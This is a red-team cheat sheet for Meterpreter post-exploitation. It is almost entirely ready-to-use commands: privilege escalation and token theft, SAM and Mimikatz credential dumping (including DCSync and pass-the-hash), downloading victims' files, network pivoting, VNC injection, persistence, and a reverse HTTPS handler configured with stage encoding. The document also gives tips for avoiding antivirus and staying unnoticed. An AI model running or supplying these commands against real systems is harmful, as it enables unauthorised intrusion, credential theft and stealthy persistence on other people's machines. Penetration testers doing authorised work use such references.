---
tags:
  - redteam
  - post-exploitation
  - meterpreter
  - metasploit
created: 2026-08-29
status: complete
---

# 🎛️ Meterpreter Cheat Sheet

> [!abstract] TL;DR
> In-memory post-exploitation agent. Encrypted comms, extension loading,
> no disk writes by default. The workhorse after initial shell.

---

## 1. Session Management

```bash
msfconsole -q
sessions -l                     # list
sessions -i 1                   # interact
sessions -u 1                   # upgrade shell → meterpreter
sessions -k 1                   # kill
sessions -C "getuid" -i 1       # run command on session without interacting
```

---

## 2. Core Commands

```text
getuid / getpid / ps             # identity & process list
getsystem                        # privesc attempts (named pipe, token tricks)
migrate <pid>                    # move into another process (use ps to pick)
steal_token <pid>                # impersonate a process token
rev2self                         # drop stolen token
hashdump                         # SAM dump (needs SYSTEM)
run post/multi/recon/local_exploit_suggester   # privesc suggestions
```

> [!tip] Migration strategy
> Migrate out of the initial exploit process into something stable + expected:
> `explorer.exe` (user context), `spoolsv.exe`/`lsass.exe` (SYSTEM, noisy).
> Spawn fresh `rundll32.exe` for a clean low-attention home.

---

## 3. File Operations

```bash
pwd / ls / cd / cat / rm / mkdir
upload /path/local/file C:\\Windows\\Temp\\f
download C:\\Users\\victim\\secrets.txt
edit file.txt                    # download, open local editor, upload on save
search -f *.kdbx                 # find files recursively
search -f *password* -d C:\\Users
```

---

## 4. Network Pivoting

```bash
# Meterpreter-side port forward (local port → through session)
portfwd add -l 445 -r 10.10.20.15 -p 445
portfwd list / flush

# Reverse port forward (target-side listener back to you)
portfwd add -R -l 9999 -r 10.10.14.5 -p 9999

# Full pivot — add route in MSF so modules reach the internal net
run autoroute -s 10.10.20.0/24
run autoroute -p                 # print routes

# SOCKS proxy through the session
use auxiliary/server/socks_proxy
set SRVPORT 1080 set VERSION 5 run -j
# then proxychains / proxychains-ng with socks5 127.0.0.1 1080
```

> [!note] Route vs portfwd
> `route` lets MSF modules traverse the pivot. `portfwd` gives any local tool
> (smbclient, evil-winrm) direct access to one host:port.

---

## 5. Credential Harvesting

```bash
load kiwi                        # Mimikatz as extension
creds_all                        # everything: hashes, plaintext, tickets
kiwi_cmd sekurlsa::logonpasswords
kiwi_cmd lsadump::dcsync /domain:corp.local /user:administrator
kiwi_cmd sekurlsa::pth /user:admin /domain:corp /ntlm:<hash> /run:cmd
load powershell                  # PS shell inside meterpreter
```

---

## 6. Recon & Situational Awareness

```bash
run post/multi/recon/local_exploit_suggester
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/windows/gather/credentials/enum_laps
run post/multi/gather/env
run post/linux/gather/enum_system
arp / netstat / route            # built-in, no extension needed
```

---

## 7. Pivoting to GUI / Persist

```bash
run vnc                          # VNC injection (screen control)
run persistence -h               # ⚠️ legacy, detectable — prefer manual svc/sched task
use post/windows/manage/persistence_exe   # cleaner: REXE + path + startup
```

> [!warning] Persistence caution
> `run persistence` writes an RC script + registry key — signatured by AV.
> Prefer native mechanisms: scheduled task, service, or WMI sub, created manually.

---

## 8. Handler Config Reference

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set ExitOnSession false
set EnableStageEncoding true
set StageEncoder x64/zutto_dekiru
set AutoRunScript post/windows/manage/migrate SPAWNRUNDLL32=true
exploit -j -i -v
```

Payload-specific options worth knowing:

```bash
set SLEEPTIME 10                 # meterpreter poll interval after migrate
set SessionCommunicationTimeout  # transport rotation
set SessionExpirationTimeout
set MeterpreterDebugBuild true   # verbose logs for troubleshooting
```

Related: [[msfvenom — Payload Generation Guide]] · [[Metasploit Framework]] · [[AV Evasion]] · [[Shellcode Injection]]